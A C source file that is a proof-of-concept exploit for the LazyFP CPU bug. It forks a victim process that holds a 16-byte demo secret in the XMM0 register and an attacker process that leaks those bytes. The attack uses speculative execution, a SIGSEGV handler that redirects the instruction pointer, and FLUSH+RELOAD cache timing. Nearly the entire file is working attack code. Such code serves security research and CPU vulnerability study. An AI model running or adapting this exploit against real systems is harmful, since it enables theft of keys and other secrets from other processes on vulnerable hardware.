#define _GNU_SOURCE

#include <ctype.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <ucontext.h>
#include <unistd.h>

#include <x86intrin.h>

/*
  asm functions
*/
extern void stopspeculate();
extern void speculate(unsigned int position);

#define TARGET_OFFSET 12
#define TARGET_SIZE (1 << TARGET_OFFSET)
#define BITS_READ 8
#define VARIANTS_READ (1 << BITS_READ)

char probe_array[VARIANTS_READ * TARGET_SIZE];
static int cache_hit_threshold;
static int hits[VARIANTS_READ];

/* Math utils */
static int min(int a, int b) { return a < b ? a : b; }
static int mysqrt(long val) {
  int root = val / 2, prevroot = 0, i = 0;

  while (prevroot != root && i++ < 100) {
    prevroot = root;
    root = (val / root + root) / 2;
  }

  return root;
}

/*
  SIGSEGV handler: catch page fault exception and redirect
  control flow to stopspeculate
*/
void sigsegv(int sig, siginfo_t *siginfo, void *context) {
  ucontext_t *ucontext = context;
  ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
  return;
}

int set_signal(void) {
  struct sigaction act = {
      .sa_sigaction = sigsegv,
      .sa_flags = SA_SIGINFO,
  };

  return sigaction(SIGSEGV, &act, NULL);
}

/*
  Get access time for specified address
*/
static inline int get_access_time(volatile char *addr) {
  unsigned long long time1, time2;
  unsigned junk;
  time1 = __rdtscp(&junk);
  (void)*addr;
  time2 = __rdtscp(&junk);
  return time2 - time1;
}

/*
  Flush cacheline associated to the probe array
*/
void clflush_target(void) {
  int i;

  for (i = 0; i < VARIANTS_READ; i++)
    _mm_clflush(&probe_array[i * TARGET_SIZE]);
}

void check(void) {
  int i, time, mix_i;
  volatile char *addr;

  for (i = 0; i < VARIANTS_READ; i++) {
    mix_i = ((i * 167) + 13) & 255;

    addr = &probe_array[mix_i * TARGET_SIZE];
    time = get_access_time(addr);

    if (time <= cache_hit_threshold)
      hits[mix_i]++;
  }
}

/*
  FLUSH+RELOAD implementation
*/
#define CYCLES 1000
int readbyte(unsigned long index) {
  int i, ret = 0, max = -1, maxi = -1;
  static char buf[256];

  memset(hits, 0, sizeof(hits));

  for (i = 0; i < CYCLES; i++) {

    // Flush probe_array
    clflush_target();

    // Wait until flush completion
    _mm_mfence();

    // Trigger LazyFP bug
    speculate(index);

    // find cache hit
    check();
  }

  // Get max hit index
  for (i = 1; i < VARIANTS_READ; i++) {
    if (hits[i] && hits[i] > max) {
      max = hits[i];
      maxi = i;
    }
  }

  return maxi;
}

/*
  Measure cache latency time and find threshold
*/
#define ESTIMATE_CYCLES 1000000
static void set_cache_hit_threshold(void) {
  long cached, uncached, i;

  // Cache all the probe array
  for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
    cached += get_access_time(probe_array);

  // Get cached elements average access time
  for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
    cached += get_access_time(probe_array);
  cached /= ESTIMATE_CYCLES;

  // Get uncached elements average access time
  for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
    _mm_clflush(probe_array);
    uncached += get_access_time(probe_array);
  }
  uncached /= ESTIMATE_CYCLES;

  // Calculate cache hit threshold time
  cache_hit_threshold = mysqrt(cached * uncached);

  printf("cached = %ld, uncached = %ld, threshold %d\n", cached, uncached,
         cache_hit_threshold);
}

/*
  Pin process to cpu0 for less noisy exploitation
*/
static void pin_cpu0() {
  cpu_set_t mask;

  /* PIN to CPU0 */
  CPU_ZERO(&mask);
  CPU_SET(0, &mask);
  sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

/*
  Victim process populates xmm0 register with some values in loop
*/
static void __attribute__((noinline)) victim() {
  char secret[16] = {0xde, 0xad, 0xbe, 0xef, 0xf0, 0x0d, 0xd0, 0xd0,
                     0xca, 0xfe, 0xba, 0xbe, 0x13, 0x37, 0x13, 0x37};
  int i;

  pin_cpu0();

  for (i = 0; i < 1000000000; i++) {
    asm volatile("movaps (%[secret]), %%xmm0\n\t"
                 : // output
                 : [secret] "r"(secret) //input
                 : // registers to clear
    );
  }

  puts("Victim exited");
}

/*
  Attacker process
*/
void attacker() {
  int ret, i;
  unsigned long size;

  memset(probe_array, 1, sizeof(probe_array));

  ret = set_signal();
  pin_cpu0();

  set_cache_hit_threshold();

  size = 16;

  for (i = 0; i < size; i++) {
    usleep(500);
    ret = readbyte(i);
    if (ret == -1)
      ret = 0xff;
    printf("read XMM0[%02d] = %02x (score=%d/%d)\n", i, ret,
           ret != 0xff ? hits[ret] : 0, CYCLES);
  }
}

// Create victim and attacker process
int main(int argc, char *argv[]) {
  int ret;

  ret = fork();
  if (ret == 0) {
    attacker();
  } else {
    victim();
  }
}
